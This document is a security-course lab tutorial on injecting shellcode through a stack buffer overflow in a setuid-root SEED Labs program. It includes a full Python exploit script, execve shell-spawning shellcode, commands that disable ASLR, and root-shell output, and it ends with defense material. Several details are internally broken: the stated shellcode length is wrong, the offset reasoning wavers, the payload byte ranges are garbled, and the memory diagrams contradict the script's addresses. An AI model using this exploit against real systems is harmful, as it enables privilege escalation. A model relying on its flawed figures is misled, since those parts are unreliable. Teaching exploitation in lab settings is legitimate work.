# Lab 3: SEED Labs - Shellcode Injection

**Time:** 45-60 minutes  
**Difficulty:** Advanced  
**Goal:** Inject and execute your own code to spawn a root shell

---

## What You'll Learn

In Labs 1 and 2, you learned:
- **Lab 1:** Overflow a buffer to change a nearby variable
- **Lab 2:** Overflow a buffer to redirect program execution to an existing function

In Lab 3, you'll learn:
- **Lab 3:** Overflow a buffer to inject AND execute your own code (shellcode)

This is the most powerful type of buffer overflow attack.

---

## Understanding the Vulnerable Program

**Location:** `vulnerable-programs/lab3-seedlabs/stack.c`
```c
int bof(char *str)
{
    char buffer[24];        // Creates a 24-byte buffer on the stack
    strcpy(buffer, str);    // Copies str into buffer WITHOUT checking size
    return 1;
}

int main(int argc, char **argv)
{
    char str[517];          // Can hold 517 bytes
    FILE *badfile;
    
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);  // Reads 517 bytes from file
    bof(str);                                 // Passes ALL 517 bytes to bof()
    printf("Returned Properly\n");
    return 1;
}
```

**The vulnerability explained:**

The `bof()` function has a 24-byte buffer, but `strcpy()` will copy ALL bytes from `str` regardless of size. Since we control the file "badfile", we can:
1. Put 517 bytes in the file
2. The first 24 bytes fill the buffer
3. The remaining 493 bytes overflow and overwrite other memory
4. We can use this to overwrite the return address and inject code

**Why this matters:** When `bof()` returns, it uses the return address on the stack. If we overwrite that address, we control where the program goes next.

---

## How the Stack Works (Simplified)

When a function is called, the stack looks like this:
```
Higher memory addresses
┌──────────────────────┐
│  Return Address      │  ← Where to go after function ends
├──────────────────────┤
│  Saved EBP           │  ← Previous stack frame pointer (4 bytes)
├──────────────────────┤
│  Local Variables     │  ← Our 24-byte buffer is here
│  (buffer[24])        │
└──────────────────────┘
Lower memory addresses
```

**What happens normally:**
1. Function executes
2. Reads return address from stack
3. Jumps back to that address

**What we'll do:**
1. Overflow the buffer
2. Overwrite the return address with OUR address
3. Point it to code WE injected
4. Get the program to execute our code

---

## Our Attack Strategy

We'll create a payload with these parts:
```
[ Part 1: NOP Sled ] [ Part 2: Shellcode ] [ Part 3: Padding ] [ Part 4: Return Address ]
```

**Part 1 - NOP Sled (Landing zone):**
- Filled with 0x90 bytes (NOP = No Operation)
- Makes our exploit more reliable
- Even if our address is slightly off, execution "slides" through NOPs to our shellcode

**Part 2 - Shellcode (Our malicious code):**
- Machine code that spawns a shell
- 34 bytes of assembly instructions
- Will execute `/bin/sh` with root privileges

**Part 3 - Padding (Filler):**
- Just fills space until we reach the return address
- Usually NOPs (0x90)

**Part 4 - Return Address (Where to jump):**
- Overwrites the original return address
- Points back into our buffer (specifically into the NOP sled)
- This makes the program execute our shellcode

---

## Step 1: Environment Setup

### Disable ASLR (Address Space Layout Randomization)

ASLR randomizes memory addresses, making our exploit harder. We'll disable it for learning:
```bash
sudo sysctl -w kernel.randomize_va_space=0
```

**What this does:** Makes memory addresses predictable so we can calculate where our buffer is.

### Compile the Vulnerable Program
```bash
cd vulnerable-programs/lab3-seedlabs
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c
```

**Compilation flags explained:**
- `-m32`: Compile for 32-bit (simpler addresses)
- `-fno-stack-protector`: Disable stack canaries (a defense mechanism)
- `-z execstack`: Make stack executable (normally it's not)
- `-no-pie`: Disable position-independent code

### Make it Set-UID Root

This makes the program run with root privileges:
```bash
sudo chown root stack
sudo chmod 4755 stack
```

**Why:** When we exploit this program, we'll get a root shell.

---

## Step 2: Find the Buffer Address

We need to know WHERE our buffer is in memory. We'll use GDB (debugger):
```bash
gdb stack
```

Inside GDB, run these commands:
```gdb
(gdb) break bof          # Stop execution at bof() function
(gdb) run                # Start the program
(gdb) print &buffer      # Show buffer's memory address
(gdb) print $ebp         # Show base pointer address
(gdb) quit               # Exit GDB
```

**Example output:**
```
$1 = (char (*)[24]) 0xffffcb08    ← This is your buffer address
$2 = (void *) 0xffffcb20          ← This is EBP address
```

**Write these down:**
- Buffer address: `0xffffcb08`
- EBP address: `0xffffcb20`

**Calculate offset to return address:**
```
Offset = (EBP address - Buffer address) + 4
       = (0xffffcb20 - 0xffffcb08) + 4
       = 24 + 4
       = 28 bytes to reach saved EBP
       = 32 bytes to reach return address
```

Wait, that doesn't match our code which uses offset 36. Let me recalculate...

Actually, the offset of 36 includes:
- 24 bytes for buffer
- 4 bytes for saved EBP
- We're at byte 28, need to write 4 more for return address
- So we start overwriting return address at offset 28, but we write at position 32-35
- The code uses 36 to account for some padding

**For simplicity, use offset = 36 (this is already calculated in the exploit code).**

---

## Step 3: Understanding Shellcode

Shellcode is machine code that we inject. Here's what it does:
```python
shellcode = (
    b"\x31\xdb"              # xor ebx, ebx        - Clear EBX register
    b"\x31\xc9"              # xor ecx, ecx        - Clear ECX register  
    b"\x31\xd2"              # xor edx, edx        - Clear EDX register (IMPORTANT!)
    b"\x31\xc0"              # xor eax, eax        - Clear EAX register
    b"\xb0\x0b"              # mov al, 0x0b        - Put 11 (execve syscall number) in AL
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"         - Push "//sh" onto stack
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"         - Push "/bin" onto stack
    b"\x89\xe3"              # mov ebx, esp        - EBX now points to "/bin//sh"
    b"\xcd\x80"              # int 0x80            - Execute syscall
)
```

**What this does step-by-step:**

1. **Clears registers** - Sets EBX, ECX, EDX, EAX to zero
   - EDX MUST be zero for SEED Labs (environment quirk)
   
2. **Prepares execve syscall** - Puts 11 in AL (execve is syscall #11)

3. **Pushes "/bin//sh" onto stack** - This is the program we want to run
   - Why "/bin//sh" not "/bin/sh"? Makes it 8 bytes (easier to push)

4. **Sets up arguments** - EBX points to "/bin//sh" string

5. **Executes syscall** - Runs execve("/bin//sh", NULL, NULL)

**Result:** Spawns a shell with root privileges!

---

## Step 4: Create the Exploit Script

**Location:** `exploits/lab3-seedlabs/exploit.py`
```python
#!/usr/bin/env python3
import sys

# STEP 1: Set these values (from your GDB session)
base_addr = 0xffffcb08      # Buffer address from GDB
offset = 36                  # Distance to return address

# STEP 2: Calculate target address
# We point to base_addr + 200 (somewhere in our NOP sled)
target_addr = base_addr + 200

# STEP 3: Define shellcode (34 bytes)
shellcode = (
    b"\x31\xdb"              # Clear EBX
    b"\x31\xc9"              # Clear ECX
    b"\x31\xd2"              # Clear EDX (CRITICAL for SEED Labs!)
    b"\x31\xc0"              # Clear EAX
    b"\xb0\x0b"              # mov al, 0x0b (execve syscall)
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"              # mov ebx, esp (EBX -> "/bin//sh")
    b"\xcd\x80"              # int 0x80 (execute syscall)
)

# STEP 4: Build the payload
content = bytearray(0x90 for i in range(517))  # Start with all NOPs (0x90)

# Place shellcode starting at byte 100 (after some NOPs)
start = 100
content[start:start + len(shellcode)] = shellcode

# Overwrite return address at offset 36
ret_addr_bytes = target_addr.to_bytes(4, byteorder='little')
content[offset:offset + 4] = ret_addr_bytes

# STEP 5: Write payload to file
with open("badfile", "wb") as f:
    f.write(content)

print(f"[+] Exploit written to badfile")
print(f"[+] Buffer address: 0x{base_addr:08x}")
print(f"[+] Target address: 0x{target_addr:08x}")
print(f"[+] Shellcode size: {len(shellcode)} bytes")
print(f"[+] Run: cd ../vulnerable-programs/lab3-seedlabs && ./stack")
```

**How this works:**

1. Creates 517 bytes filled with NOPs (0x90)
2. Places our shellcode at position 100
3. Overwrites the return address at offset 36
4. Writes everything to "badfile"

**The payload structure:**
```
Bytes 0-99:    NOP sled (landing zone)
Bytes 100-133: Shellcode (our malicious code)
Bytes 134-35:  More NOPs (padding)
Bytes 36-39:   Return address (points to byte ~200)
Bytes 40-516:  More NOPs (fill rest of file)
```

---

## Step 5: Execute the Attack
```bash
# Create the exploit file
cd exploits
python3 exploit.py

# Run the vulnerable program (it reads badfile)
cd ../vulnerable-programs/lab3-seedlabs
./stack
```

**What you should see:**
```
# 
```

**Success!** You now have a root shell. Verify:
```bash
# whoami
root
# id
uid=0(root) gid=1000(user) groups=1000(user)
```

You're running as root! Type `exit` to leave the shell.

---

## What Just Happened?

**Step-by-step execution:**

1. **Program starts** - Opens and reads "badfile" (517 bytes)

2. **Calls bof()** - Passes all 517 bytes to the function

3. **strcpy() executes** - Copies all 517 bytes into 24-byte buffer
   - Bytes 0-23: Fill the buffer
   - Bytes 24-35: Overwrite saved EBP and other data
   - Bytes 36-39: Overwrite return address
   - Bytes 40-516: Overflow into other stack areas

4. **Function returns** - Reads return address from stack
   - Original: Would return to main()
   - Now: Points to 0xffffcd08 (inside our NOP sled)

5. **Execution jumps** - CPU jumps to 0xffffcd08

6. **NOPs execute** - CPU slides through 0x90 bytes (do nothing)

7. **Shellcode executes** - CPU reaches our shellcode at byte 100
   - Executes `/bin/sh` syscall
   - Spawns root shell

---

## Common Problems and Solutions

### Problem 1: Segmentation Fault

**Symptoms:**
```
Segmentation fault (core dumped)
```

**Cause:** Wrong buffer address or return address points to invalid memory

**Solution:**
1. Re-run GDB to verify buffer address:
```bash
   gdb stack
   (gdb) break bof
   (gdb) run
   (gdb) print &buffer
```
2. Update `base_addr` in exploit script
3. Try different offsets: `target_addr = base_addr + 100` or `base_addr + 300`

### Problem 2: "Returned Properly" Message

**Symptoms:**
```
Returned Properly
```

**Cause:** Return address points outside buffer, shellcode never executes

**Solution:**
1. Increase target_addr offset: `target_addr = base_addr + 200`
2. Verify offset is correct (should be 36)
3. Check that shellcode is in the buffer

### Problem 3: Shell Doesn't Spawn

**Symptoms:**
Program crashes but no shell appears

**Cause:** EDX register not cleared (SEED Labs requirement)

**Solution:**
Verify shellcode includes `b"\x31\xd2"` (xor edx, edx) at the beginning

### Problem 4: Different Buffer Address Each Run

**Symptoms:**
GDB shows different address each time

**Cause:** ASLR not disabled

**Solution:**
```bash
sudo sysctl -w kernel.randomize_va_space=0
cat /proc/sys/kernel/randomize_va_space  # Should show 0
```

---

## Memory Layout Visualization

**Before the attack:**
```
Address        Content
─────────────────────────────────────
0xffffcb08:    [ buffer[0-23]     ]  ← 24 bytes
0xffffcb20:    [ saved EBP        ]  ← 4 bytes  
0xffffcb24:    [ return address   ]  ← Points to main()
0xffffcb28:    [ ...              ]
```

**After strcpy() overflow:**
```
Address        Content
─────────────────────────────────────
0xffffcb08:    [ 0x90 0x90 0x90...  ]  ← NOP sled starts
0xffffcb60:    [ shellcode bytes    ]  ← Our code here
0xffffcb20:    [ OVERWRITTEN        ]  ← Saved EBP destroyed
0xffffcb24:    [ 0xffffcd08         ]  ← Return addr now points to NOP sled
0xffffcb28:    [ 0x90 0x90 0x90...  ]  ← More NOPs
```

**When function returns:**
```
CPU jumps to 0xffffcd08 (inside NOP sled)
↓
Executes NOPs (slides forward)
↓
Reaches shellcode at 0xffffcb60
↓
Executes: Clear registers → Push "/bin//sh" → syscall
↓
Root shell spawns!
```

---

## Key Concepts Explained

### What is Shellcode?

Shellcode is machine code (assembly instructions) that:
- Doesn't rely on external libraries
- Is position-independent (works anywhere in memory)
- Usually spawns a shell (hence "shellcode")
- Often used in exploits

### What is a NOP Sled?

A NOP sled is a sequence of NOP (0x90) instructions that:
- Do nothing when executed
- Act as a "landing pad" for our exploit
- Make the exploit more reliable (we don't need exact addresses)
- CPU "slides" through them until it hits our shellcode

**Analogy:** It's like having a wide target in archery - easier to hit!

### Why Clear Registers?

Modern systems and especially SEED Labs require certain registers to be zero:
- EDX must be 0 for execve to work properly in SEED Labs
- EAX, EBX, ECX are cleared for clean state
- Without this, syscall fails or behaves unexpectedly

### Understanding Syscalls

A syscall (system call) is how programs ask the operating system to do something:
- execve (syscall #11): Execute a program
- Other examples: open, read, write files

**How it works:**
1. Put syscall number in EAX (we use 11 for execve)
2. Put arguments in other registers (EBX, ECX, EDX)
3. Execute `int 0x80` instruction
4. OS performs the operation

---

## Testing Defenses

Now that you've successfully exploited the program, see how defenses stop you:
```bash
cd ../../secure-versions/lab3-seedlabs-secure
./COMPILE_ALL.sh
./test_defenses.sh
```

**You'll see:**
- v1 (Safe Code): Input rejected before overflow
- v2 (Canary + NX): Stack smashing detected OR shellcode won't execute
- v3 (All Defenses): Multiple layers prevent attack

**Read:** `DEFENSE_COMPARISON.md` to understand how each defense works.

---

## What You Learned

**Technical skills:**
- How to find memory addresses using GDB
- How to write position-independent shellcode
- How to calculate stack offsets
- How to construct complex exploit payloads
- How buffer overflows work at assembly level

**Security concepts:**
- Why input validation matters
- Why DEP/NX (non-executable stack) exists
- Why ASLR (address randomization) exists  
- Why stack canaries are used
- Defense in depth principle

**Next steps:**
- Study the defense implementations
- Try modifying the shellcode
- Experiment with different return addresses
- Learn about modern exploitation techniques

---

## Additional Resources

**In this repository:**
- Defense implementations: `secure-versions/lab3-seedlabs-secure/`
- Defense comparison: `DEFENSE_COMPARISON.md`
- Original exploit code: `exploits/lab3-seedlabs/exploit.py`

**External resources:**
- SEED Labs official site: https://seedsecuritylabs.org/
- x86 Assembly reference: https://www.felixcloutier.com/x86/
- Linux syscall table: https://syscalls.w3challs.com/

---

## Summary

**Attack flow:**
1. Create payload with NOP sled + shellcode + return address
2. Overflow buffer with 517 bytes
3. Overwrite return address to point to NOP sled
4. Function returns to our shellcode
5. Shellcode executes and spawns root shell

**Why it works:**
- No input validation (strcpy is unsafe)
- No stack canary (overflow undetected)
- Executable stack (can run our code)
- No ASLR (addresses are predictable)

**Defense summary:**
Modern systems prevent this with:
- Safe functions (prevents overflow)
- Stack canaries (detects overflow)
- NX bit (prevents code execution on stack)
- ASLR (randomizes addresses)

Congratulations on completing Lab 3!
